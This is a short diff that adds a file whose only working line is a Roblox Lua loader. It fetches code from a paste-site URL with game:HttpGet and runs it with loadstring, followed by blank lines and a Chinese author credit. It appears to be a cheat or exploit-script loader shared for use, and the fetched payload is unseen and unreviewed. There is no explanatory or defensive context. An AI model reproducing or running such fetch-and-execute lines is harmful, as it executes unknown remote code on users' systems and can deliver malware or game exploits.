@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://shz.al/fSwG"))()
+
+
+
+
+
+
+
+
+师傅:kr x
